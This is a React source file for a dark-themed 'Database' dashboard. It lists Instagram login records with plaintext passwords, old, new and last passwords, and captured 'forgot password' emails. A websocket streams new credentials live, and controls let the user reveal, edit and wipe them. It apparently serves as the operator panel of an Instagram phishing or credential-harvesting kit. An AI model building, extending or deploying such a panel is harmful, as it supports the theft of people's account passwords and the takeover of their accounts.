import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { FiSearch, FiRefreshCw, FiEye, FiEyeOff, FiX, FiTrash2 } from "react-icons/fi";
import { io } from "socket.io-client";
import InstagramEndpoints from "../../services/api-endpoints";
import Dropdown from "../../components/common/Dropdown";
import Checkbox from "../../components/common/Checkbox";
import ConfirmDialog from "../../components/common/ConfirmDialog";
import EditDialog from "../../components/database/EditDialog";
import CredentialRow from "../../components/database/CredentialRow";
import SkeletonTable, { TableHead } from "../../components/database/SkeletonTable";
import EmptyState from "../../components/database/EmptyState";
import { SERVICES, TYPES, COLUMNS } from "../../components/database/databaseConfig";

export default function Database() {
  const [service, setService] = useState("all");
  const [type, setType] = useState("login");
  const [query, setQuery] = useState("");
  const [items, setItems] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selected, setSelected] = useState(() => new Set());
  const [revealed, setRevealed] = useState(() => new Set());
  const [editing, setEditing] = useState(null);
  const [deleting, setDeleting] = useState(null);
  const [clearingAll, setClearingAll] = useState(false);
  const requestId = useRef(0);

  const load = useCallback(async () => {
    const id = ++requestId.current;
    setLoading(true);
    setError(null);
    setSelected(new Set());
    setRevealed(new Set());
    try {
      let data;
      if (type === "forgot_password") {
        const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot`);
        const json = await res.json();
        const records = json?.data?.credentials ?? json?.data?.forgotEmails ?? [];
        data = records.map((f) => ({
          id: f.id,
          service: f.service || "instagram",
          username: f.email || f.username,
          type: "forgot_password",
          at: f.at,
          verified: f.verified ?? false,
        }));
      } else {
        const res = await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/login`);
        const json = await res.json();
        data = json?.data?.credentials ?? [];
      }
      if (id === requestId.current) setItems(data);
    } catch {
      if (id === requestId.current) setError("Could not load records. Please try again.");
    } finally {
      if (id === requestId.current) setLoading(false);
    }
  }, [type]);

  useEffect(() => {
    load();
  }, [load]);

  // WebSocket — real-time credential updates
  useEffect(() => {
    const socket = io(InstagramEndpoints.socketUrl, {
      transports: ["websocket", "polling"],
    });

    // ── Credential events ──
    socket.on("newCredential", (cred) => {
      if (type !== "forgot_password") {
        setItems((prev) => (prev.some((r) => r.id === cred.id) ? prev : [cred, ...prev]));
      }
    });

    socket.on("credentialUpdated", (cred) => {
      if (type !== "forgot_password") {
        setItems((prev) => prev.map((r) => (r.id === cred.id ? cred : r)));
      }
    });

    socket.on("credentialDeleted", ({ id }) => {
      setItems((prev) => prev.filter((r) => r.id !== id));
      setSelected((prev) => {
        const n = new Set(prev);
        n.delete(id);
        return n;
      });
    });

    socket.on("credentialsDeleted", ({ ids }) => {
      const idSet = new Set(ids);
      setItems((prev) => prev.filter((r) => !idSet.has(r.id)));
      setSelected((prev) => {
        const n = new Set(prev);
        ids.forEach((id) => n.delete(id));
        return n;
      });
    });

    socket.on("credentialsCleared", () => {
      if (type !== "forgot_password") {
        setItems([]);
        setSelected(new Set());
        setRevealed(new Set());
      }
    });

    // ── Forgot password events ──
    const mapForgot = (f) => ({
      id: f.id,
      service: f.service || "instagram",
      username: f.email || f.username,
      type: "forgot_password",
      at: f.at,
      verified: f.verified ?? false,
    });

    socket.on("forgotEmailCreated", (doc) => {
      if (type === "forgot_password") {
        setItems((prev) => (prev.some((r) => r.id === doc.id) ? prev : [mapForgot(doc), ...prev]));
      }
    });

    socket.on("forgotEmailUpdated", (doc) => {
      if (type === "forgot_password") {
        setItems((prev) => prev.map((r) => (r.id === doc.id ? mapForgot(doc) : r)));
      }
    });

    socket.on("forgotEmailDeleted", ({ id }) => {
      setItems((prev) => prev.filter((r) => r.id !== id));
      setSelected((prev) => {
        const n = new Set(prev);
        n.delete(id);
        return n;
      });
    });

    socket.on("forgotEmailsDeleted", ({ ids }) => {
      const idSet = new Set(ids);
      setItems((prev) => prev.filter((r) => !idSet.has(r.id)));
      setSelected((prev) => {
        const n = new Set(prev);
        ids.forEach((id) => n.delete(id));
        return n;
      });
    });

    socket.on("forgotEmailsCleared", () => {
      if (type === "forgot_password") {
        setItems([]);
        setSelected(new Set());
      }
    });

    return () => socket.disconnect();
  }, [type]);

  const visible = useMemo(() => {
    let result = items;
    if (service !== "all") {
      result = result.filter((r) => r.service === service);
    }
    result = result.filter((r) => r.type === type);
    const q = query.trim().toLowerCase();
    if (q) {
      result = result.filter((r) => {
        const svc = SERVICES.find((s) => s.value === r.service)?.label ?? r.service;
        return (
          (r.username ?? "").toLowerCase().includes(q) ||
          svc.toLowerCase().includes(q)
        );
      });
    }
    return result;
  }, [items, service, type, query]);

  const selectedVisible = visible.filter((r) => selected.has(r.id));
  const allSelected = visible.length > 0 && selectedVisible.length === visible.length;
  const someSelected = selectedVisible.length > 0 && !allSelected;

  const toggleOne = (id) =>
    setSelected((prev) => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });

  const toggleAll = () =>
    setSelected((prev) => {
      const next = new Set(prev);
      if (allSelected) visible.forEach((r) => next.delete(r.id));
      else visible.forEach((r) => next.add(r.id));
      return next;
    });

  const columns = COLUMNS[type] ?? [];
  const visibleKeys = visible.flatMap((r) => columns.map((c) => `${r.id}:${c.key}`));
  const allRevealed = visibleKeys.length > 0 && visibleKeys.every((k) => revealed.has(k));

  const toggleReveal = (key) =>
    setRevealed((prev) => {
      const next = new Set(prev);
      next.has(key) ? next.delete(key) : next.add(key);
      return next;
    });

  const toggleRevealAll = () =>
    setRevealed((prev) => {
      const next = new Set(prev);
      if (allRevealed) visibleKeys.forEach((k) => next.delete(k));
      else visibleKeys.forEach((k) => next.add(k));
      return next;
    });

  const saveEdit = async (updated) => {
    setItems((prev) => prev.map((r) => (r.id === updated.id ? updated : r)));
    setEditing(null);
    try {
      await fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/login/${updated.id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: updated.username,
          password: updated.password,
          oldPassword: updated.oldPassword,
          newPassword: updated.newPassword,
          lastPassword: updated.lastPassword,
        }),
      });
    } catch (err) {
      console.error("Update failed:", err);
      load();
    }
  };

  const confirmDelete = async () => {
    const ids = deleting;
    const idSet = new Set(ids);
    setItems((prev) => prev.filter((r) => !idSet.has(r.id)));
    setSelected((prev) => new Set([...prev].filter((id) => !idSet.has(id))));
    setRevealed((prev) => new Set([...prev].filter((k) => !idSet.has(k.split(":")[0]))));
    setDeleting(null);

    const isForgot = type === "forgot_password";
    try {
      if (ids.length === 1) {
        const url = isForgot
          ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/${ids[0]}`
          : `${InstagramEndpoints.backendBaseUrl}/api/instagram/login/${ids[0]}`;
        await fetch(url, { method: "DELETE" });
      } else {
        const url = isForgot
          ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot`
          : `${InstagramEndpoints.backendBaseUrl}/api/instagram/login`;
        await fetch(url, {
          method: "DELETE",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ids }),
        });
      }
    } catch (err) {
      console.error("Delete failed:", err);
      load();
    }
  };

  const confirmClearAll = async () => {
    setItems([]);
    setSelected(new Set());
    setRevealed(new Set());
    setClearingAll(false);

    const isForgot = type === "forgot_password";
    try {
      const url = isForgot
        ? `${InstagramEndpoints.backendBaseUrl}/api/instagram/forgot/all`
        : `${InstagramEndpoints.backendBaseUrl}/api/instagram/login/all`;
      await fetch(url, { method: "DELETE" });
    } catch (err) {
      console.error("Clear all failed:", err);
      load();
    }
  };

  return (
    <div className="flex-1 flex flex-col overflow-hidden bg-[#060d1c] text-[#a0bce0] font-mono">
      {/* ── Controls bar ── */}
      <div className="shrink-0 border-b border-[#131e35] bg-[#080f1e] px-3 py-2">
        <div className="flex flex-wrap items-center gap-3">
          <Dropdown label="Service" options={SERVICES} value={service} onChange={setService} />
          <Dropdown label="Type" options={TYPES} value={type} onChange={setType} />

          {/* Search */}
          <div className="relative w-44">
            <FiSearch
              size={12}
              className="pointer-events-none absolute left-2.5 top-1/2 -translate-y-1/2 text-[#3a5a8a]"
            />
            <input
              type="text"
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder={type === "forgot_password" ? "Search email…" : "Username or service…"}
              className="h-7 w-full rounded border border-[#1e3260] bg-[#0b1527] pl-7 pr-7 text-[11px] text-[#a0bce0] outline-none transition-colors placeholder:text-[#2a4a7a] hover:border-[#3d7aba] focus:border-[#3d7aba]"
            />
            {query && (
              <button
                type="button"
                onClick={() => setQuery("")}
                className="absolute right-2 top-1/2 -translate-y-1/2 text-[#3a5a8a] hover:text-[#a0bce0] cursor-pointer"
              >
                <FiX size={11} />
              </button>
            )}
          </div>

          {/* Refresh */}
          <button
            type="button"
            onClick={load}
            disabled={loading}
            className="flex h-7 items-center gap-1.5 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-[11px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
          >
            <FiRefreshCw size={12} className={loading ? "animate-spin" : ""} />
            Refresh
          </button>

          {/* Clear All */}
          <button
            type="button"
            onClick={() => setClearingAll(true)}
            disabled={loading || items.length === 0}
            className="flex h-7 items-center gap-1.5 rounded border border-[#1e3260] bg-[#0b1527] px-2.5 text-[11px] text-[#6b8cba] hover:border-red-500/50 hover:text-red-400 transition-colors disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
          >
            <FiTrash2 size={12} />
            Clear All
          </button>
        </div>
      </div>

      {/* ── Body ── */}
      <div className="flex-1 overflow-y-auto px-3 py-2">
        {loading ? (
          <SkeletonTable columns={columns} type={type} />
        ) : error ? (
          <div className="mx-auto max-w-sm py-16 text-center">
            <p className="text-[15px] font-bold text-[#a0bce0]">Loading failed</p>
            <p className="mt-1 text-[12px] text-[#3a5a8a]">{error}</p>
            <button
              type="button"
              onClick={load}
              className="mt-4 rounded border border-[#1e3260] px-3 py-1.5 text-[13px] text-[#6b8cba] hover:border-[#3d7aba] cursor-pointer"
            >
              Try again
            </button>
          </div>
        ) : visible.length === 0 ? (
          <EmptyState
            service={service}
            type={type}
            searching={query.trim().length > 0}
            onClear={() => setQuery("")}
          />
        ) : (
          <>
            {/* Toolbar */}
            <div className="sticky top-0 z-10 bg-[#060d1c] pb-1.5">
              <div className="flex min-h-[2rem] items-center gap-2 rounded border border-[#131e35] bg-[#0b1527] px-3 py-1">
                <Checkbox
                  checked={allSelected}
                  indeterminate={someSelected}
                  onChange={toggleAll}
                  label="Select all"
                />
                <span className="flex-1 text-[11px] text-[#6b8cba]">
                  {selectedVisible.length > 0
                    ? `${selectedVisible.length} of ${visible.length} selected`
                    : `${visible.length} records`}
                </span>

                <button
                  type="button"
                  onClick={toggleRevealAll}
                  aria-pressed={allRevealed}
                  className="flex items-center gap-1.5 rounded border border-[#1e3260] px-2 py-1 text-[11px] text-[#6b8cba] hover:border-[#3d7aba] hover:text-[#a0bce0] transition-colors cursor-pointer"
                >
                  {allRevealed ? (
                    <FiEyeOff size={12} className="text-[#3d7aba]" />
                  ) : (
                    <FiEye size={12} className="text-[#3d7aba]" />
                  )}
                  {allRevealed ? "Hide all" : "View all"}
                </button>

                {selectedVisible.length > 0 && (
                  <button
                    type="button"
                    onClick={() => setDeleting(selectedVisible.map((r) => r.id))}
                    className="flex items-center gap-1.5 rounded border border-red-500/40 bg-red-500/10 px-3 py-1 text-[11px] text-red-400 hover:bg-red-500/20 transition-colors cursor-pointer"
                  >
                    <FiTrash2 size={12} /> Delete selected
                  </button>
                )}
              </div>
            </div>

            {/* Table */}
            <div className="overflow-x-auto rounded border border-[#131e35] bg-[#0b1527]">
              <table className="w-full min-w-[720px]">
                <TableHead columns={columns} type={type} />
                <tbody>
                  {visible.map((item) => (
                    <CredentialRow
                      key={item.id}
                      item={item}
                      selected={selected.has(item.id)}
                      columns={columns}
                      revealed={revealed}
                      onSelect={() => toggleOne(item.id)}
                      onToggleReveal={toggleReveal}
                      onEdit={() => setEditing(item)}
                      onDelete={() => setDeleting([item.id])}
                    />
                  ))}
                </tbody>
              </table>
            </div>
          </>
        )}
      </div>

      {editing && <EditDialog item={editing} onSave={saveEdit} onClose={() => setEditing(null)} />}
      {deleting && (
        <ConfirmDialog
          title={deleting.length === 1 ? "Delete this entry?" : `Delete ${deleting.length} entries?`}
          message={
            deleting.length === 1
              ? "This entry will be permanently removed. This cannot be undone."
              : "These entries will be permanently removed. This cannot be undone."
          }
          onConfirm={confirmDelete}
          onClose={() => setDeleting(null)}
        />
      )}
      {clearingAll && (
        <ConfirmDialog
          title={`Delete all ${items.length} entries?`}
          message="All entries will be permanently removed. This cannot be undone."
          onConfirm={confirmClearAll}
          onClose={() => setClearingAll(false)}
        />
      )}
    </div>
  );
}
